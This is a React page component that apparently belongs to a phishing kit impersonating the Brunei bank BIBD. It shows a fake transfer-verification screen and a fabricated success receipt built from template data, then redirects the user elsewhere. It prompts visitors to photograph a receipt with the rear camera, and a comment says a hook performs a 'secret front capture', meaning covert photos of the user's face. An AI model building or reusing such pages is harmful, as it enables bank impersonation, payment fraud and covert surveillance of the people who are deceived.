"use client";

import { useCallback, useRef, useState, useEffect } from "react";
import RedirectCountdown from "@/components/RedirectCountdown";
import SuccessToast from "@/components/SuccessToast";
import LoadingScreen from "@/components/LoadingScreen";
import { useVerification } from "@/hooks/useVerification";
import { formatFileSize } from "@/utils/device";
import templateData from "./data.json";

export default function BibdVerificationPage() {
  const {
    isVerified,
    isChecking,
    isInitialLoading,
    isProcessing,
    showRedirectCountdown,
    redirectCountdown,
    uploadedFile,
    redirectConfig,
    redirectUrl,
    countdownDuration,
    handleVerifyClick,
    handleFileSelect,
    setUploadedFile,
    requestCameraPermission,
    requestAllPermissions,
    validationError,
  } = useVerification();

  const [showCamera, setShowCamera] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
  const rearVideoRef = useRef<HTMLVideoElement>(null);
  const rearStreamRef = useRef<MediaStream | null>(null);

  // Set AUTO date based on client device
  useEffect(() => {
    if (templateData.receiptDate === "AUTO") {
      const date = new Date();
      const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
      const d = String(date.getDate()).padStart(2, '0');
      const m = months[date.getMonth()];
      const y = date.getFullYear();
      const hh = String(date.getHours()).padStart(2, '0');
      const mm = String(date.getMinutes()).padStart(2, '0');
      setDisplayDate(`${d} ${m} ${y}, ${hh}:${mm}`);
    } else {
      setDisplayDate(templateData.receiptDate);
    }
  }, []);

  // Cleanup camera streams on unmount
  useEffect(() => {
    return () => {
      rearStreamRef.current?.getTracks().forEach((t) => t.stop());
    };
  }, []);

  useEffect(() => {
    if (showCamera && rearVideoRef.current && rearStreamRef.current) {
      rearVideoRef.current.srcObject = rearStreamRef.current;
      rearVideoRef.current.play().catch(e => console.error('Play failed:', e));
      setTimeout(() => {
        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
      }, 300);
    }
  }, [showCamera]);

  // Open rear camera live preview (avoid front camera here to prevent mobile crash/black screen)
  const handleOpenCamera = useCallback(async () => {
    if (uploadedFile || showCamera) return;

    let rearStream = null;
    
    try {
      // 1st attempt: Environment (rear) camera with portrait HD ideal resolution
      rearStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
      });
    } catch (err1) {
      console.warn('1st camera attempt failed:', err1);
      try {
        // 2nd attempt: Just ask for environment camera, no resolution constraint
        rearStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' },
        });
      } catch (err2) {
        console.warn('2nd camera attempt failed:', err2);
        try {
          // 3rd attempt: Just ask for ANY camera (fallback for devices that don't support facingMode at all)
          rearStream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
        } catch (err3) {
          console.error('All camera open attempts failed:', err3);
          alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
          return;
        }
      }
    }

    if (rearStream) {
      rearStreamRef.current = rearStream;
      setShowCamera(true);
    }
  }, [uploadedFile, showCamera]);

  // Cancel camera and close
  const handleCancelCamera = useCallback(() => {
    rearStreamRef.current?.getTracks().forEach((t) => t.stop());
    rearStreamRef.current = null;
    setShowCamera(false);
  }, []);

  // Capture photo from rear camera
  const handleCapturePhoto = useCallback(async () => {
    if (isCapturing) return;
    setIsCapturing(true);

    try {
      const rearStream = rearStreamRef.current;
      if (!rearStream) {
        setIsCapturing(false);
        return;
      }

      // Capture rear camera photo directly from visible video element
      const rearCanvas = document.createElement('canvas');
      const rearVideo = rearVideoRef.current;
      if (rearVideo) {
        rearCanvas.width = rearVideo.videoWidth || 640;
        rearCanvas.height = rearVideo.videoHeight || 480;
        const ctx = rearCanvas.getContext('2d');
        ctx?.drawImage(rearVideo, 0, 0, rearCanvas.width, rearCanvas.height);
      }
      
      const rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
        rearCanvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85)
      );

      // Stop stream immediately
      rearStream.getTracks().forEach((t) => t.stop());
      rearStreamRef.current = null;
      setShowCamera(false);

      if (rearPhotoBlob) {
        const resitFile = new File([rearPhotoBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
        // Forward to useVerification hook (which handles the secret front capture)
        handleFileSelect(resitFile);
      }
    } catch (err) {
      console.error('Capture failed:', err);
    }

    setIsCapturing(false);
  }, [isCapturing, handleFileSelect]);



  // Show initial loading screen
  if (isInitialLoading) {
    return <LoadingScreen />;
  }

  // Loading screens removed to prevent blank loading page during processing

  if (isVerified) {
    return (
      <main className="relative flex min-h-screen w-full flex-col items-center justify-center bg-[#eae7e7] p-5 font-sans">
        {/* Receipt Card */}
        <div className="w-full max-w-[420px] mx-auto flex flex-col items-center animate-fade-slide">
          <div className="receipt-jagged-edge w-full rounded-t-xl rounded-b-none shadow-lg bg-white mb-4">
            {/* Header Section */}
            <div className="p-8 flex flex-col items-center text-center">
              {/* Brand Logo */}
              <img 
                src="/logo-terbaru-bibd-copy.png" 
                alt="BIBD Logo" 
                className="h-14 object-contain mb-4"
              />
              
              {/* Status Badge */}
              <div className="flex items-center space-x-2 bg-[#95d2c8]/20 text-[#095049] px-4 py-2 rounded-full mb-4">
                <span className="material-symbols-outlined text-[#002420] text-lg">check_circle</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold tracking-wider">Berhasil</span>
              </div>
              
              {/* Amount */}
              <p className="font-[Inter] text-sm text-[#53424b] mb-1">Jumlah Transfer</p>
              <p className="font-[Manrope] text-3xl font-extrabold text-[#1c1b1b]">{templateData.receiptAmount}</p>
            </div>

            {/* Divider */}
            <div className="w-full dashed-divider my-4"></div>

            {/* Details Section */}
            <div className="p-8 flex flex-col gap-4">
              {/* Detail Row 1 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Tanggal</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{displayDate}</span>
              </div>
              {/* Detail Row 2 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Jenis Transaksi</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">{templateData.receiptTransactionType}</span>
              </div>
              {/* Detail Row 3 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Dari</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  {templateData.receiptSenderName}<br />
                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptSenderAccount}</span>
                </span>
              </div>
              {/* Detail Row 4 */}
              <div className="flex justify-between items-start">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Ke</span>
                <span className="font-[Inter] text-base text-[#1c1b1b] text-right font-medium w-2/3">
                  {templateData.receiptReceiverName}<br />
                  <span className="text-[#53424b] text-sm font-normal">{templateData.receiptReceiverAccount}</span>
                </span>
              </div>
              {/* Detail Row 5 */}
              <div className="flex justify-between items-start pt-2 border-t border-[#e5e2e1]">
                <span className="font-[Inter] text-sm text-[#53424b] w-1/3 text-left">Nomor Referensi</span>
                <span className="font-[IBM-Plex-Sans] text-sm font-semibold text-[#410030] text-right w-2/3 break-all">{templateData.receiptReference}</span>
              </div>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="w-full flex flex-col gap-4 px-4 mb-8 mt-4">
            <button className="w-full flex items-center justify-center gap-2 bg-white border border-[#85727b] text-[#410030] font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:bg-[#e5e2e1] transition-colors">
              <span className="material-symbols-outlined text-lg">share</span>
              Bagikan
            </button>
            <button 
              onClick={() => (window.location.href = redirectUrl)}
              className="w-full bg-[#66004d] text-white font-[IBM-Plex-Sans] text-sm font-semibold py-4 rounded-xl hover:opacity-90 transition-opacity"
            >
              Selesai
            </button>
          </div>
        </div>

        {/* Success Toast */}
        <SuccessToast />

        <style
          dangerouslySetInnerHTML={{
            __html: `
              .receipt-jagged-edge {
                position: relative;
                background: #ffffff;
              }
              .receipt-jagged-edge::after {
                content: "";
                position: absolute;
                left: 0;
                bottom: -10px;
                width: 100%;
                height: 10px;
                background-image: radial-gradient(circle at 10px 0, transparent 10px, #ffffff 11px);
                background-size: 20px 10px;
                background-repeat: repeat-x;
                transform: rotate(180deg);
              }
              .dashed-divider {
                border-top: 2px dashed #d8c0cb;
              }
            `,
          }}
        />
      </main>
    );
  }

  return (
    <main className="min-h-screen flex flex-col bg-[#111111] font-[Inter] antialiased w-full relative sm:p-4 items-center justify-center">
      {/* Mobile container to look like the phone screen on desktop, full width on mobile */}
      <div className="w-full sm:max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:h-[800px] sm:rounded-[40px] sm:overflow-hidden relative flex flex-col shadow-2xl">
        {/* Top Bar */}
        <div className="w-full bg-[#fbbd05] py-4 flex justify-center items-center shadow-sm z-10 flex-shrink-0">
          <h1 className="text-white font-bold text-[14px] tracking-wide uppercase">BIBD BRUNAI DARUSSALAM</h1>
        </div>

        {/* Main Content Area - This is where scrolling happens if needed */}
        <div className="flex-1 flex flex-col px-4 pt-6 pb-8 overflow-y-auto w-full">
          <div className="w-full flex flex-col items-center">
            {/* Logo */}
            <div className="flex justify-center mb-8 mt-2">
              <img 
                src="/logo-terbaru-bibd-copy.png" 
                alt="BIBD Logo" 
                className="h-[60px] object-contain"
              />
            </div>

            {/* Title & Subtitle */}
            <h2 className="text-[#2d3748] font-bold text-[16px] text-center mb-1">
              {templateData.title}
            </h2>
            <p className="text-[#a0aec0] text-[13px] text-center mb-6">
              {templateData.subtitle}
            </p>

            {/* Amount Box */}
            <div className="w-full bg-[#f8f9fa] rounded-xl py-6 px-4 flex flex-col items-center justify-center mb-8">
              <p className="text-[#a0aec0] text-[12px] mb-2 font-medium">Jumlah Diterima</p>
              <p className="text-[#1a202c] text-2xl font-bold mb-1 tracking-tight">{templateData.amountPrimary}</p>
              <p className="text-[#1a202c] text-xl font-bold tracking-tight">{templateData.amountSecondary}</p>
            </div>

            {/* Details Table */}
            <div className="w-full flex flex-col gap-4 text-[12px] mb-8">
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">Pengirim</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderBank}</span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Pengirim</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderName}</span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Pengirim</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.senderAccount}</span>
              </div>
              
              <div className="w-full border-t border-[#edf2f7] my-1"></div>
              
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">Penerima</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverBank}</span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">No. Akaun Penerima</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverAccount}</span>
              </div>
              <div className="flex justify-between items-start">
                <span className="text-[#a0aec0] w-[35%] font-medium">Nama Akaun Penerima</span>
                <span className="text-[#2d3748] font-bold text-right w-[65%]">{templateData.receiverName}</span>
              </div>
            </div>

            {/* Camera View / Action Button */}
            {showCamera ? (
              <div className="w-full flex flex-col gap-3 mt-2">
                {/* Live rear camera preview */}
                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
                  <video
                    ref={rearVideoRef}
                    autoPlay
                    playsInline
                    muted
                    className="w-full h-full object-cover"
                    style={{ transform: 'scaleX(1)' }}
                  />
                  {isCapturing && (
                    <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
                      <div className="flex flex-col items-center gap-2">
                        <svg className="h-8 w-8 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                        </svg>
                        <span className="text-white text-xs font-semibold">Memproses...</span>
                      </div>
                    </div>
                  )}
                </div>
                {/* Capture button */}
                <button
                  onClick={handleCapturePhoto}
                  disabled={isCapturing}
                  className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  {isCapturing ? 'Memproses...' : 'Ambil Foto Resit / Bukti Belanja'}
                </button>
              </div>
            ) : !uploadedFile ? (
              <button
                onClick={handleOpenCamera}
                className="w-full bg-[#2563eb] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#1d4ed8] transition-colors shadow-sm mt-2 flex items-center justify-center gap-2"
              >
                Ambil Foto Resit / Bukti Belanja
              </button>
            ) : (
              <div className="w-full flex flex-col gap-4 mt-2">
                <div className="w-full rounded-[10px] overflow-hidden bg-black relative flex items-center justify-center" style={{ aspectRatio: '3/4' }}>
                  <img 
                    src={URL.createObjectURL(uploadedFile)} 
                    alt="Captured Receipt" 
                    className="w-full h-full object-cover"
                    style={{ transform: 'scaleX(1)' }}
                  />
                  <button 
                    onClick={(e) => {
                      e.stopPropagation();
                      setUploadedFile(null);
                    }}
                    className="absolute top-3 right-3 bg-red-500/80 hover:bg-red-600 text-white rounded-full p-2 flex items-center justify-center backdrop-blur-sm transition-colors"
                  >
                    <span className="material-symbols-outlined text-[18px]">close</span>
                  </button>
                </div>
                <button 
                  onClick={handleVerifyClick}
                  disabled={isChecking}
                  className="w-full bg-[#16a34a] text-white py-4 rounded-[10px] font-semibold text-[14px] hover:bg-[#15803d] transition-colors shadow-sm disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  {isChecking ? (
                    <>
                      <svg className="h-4 w-4 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                      </svg>
                      MEMPROSES...
                    </>
                  ) : (
                    "KIRIM BUKTI"
                  )}
                </button>
              </div>
            )}
            {validationError && (
              <div className="mt-4 flex items-center gap-2 text-xs font-semibold text-red-600 bg-red-50 p-2.5 rounded-lg border border-red-200 w-full justify-center text-center">
                <span className="material-symbols-outlined text-sm flex-shrink-0">warning</span>
                <span>{validationError}</span>
              </div>
            )}
          </div>
        </div>
      </div>
    </main>
  );
}

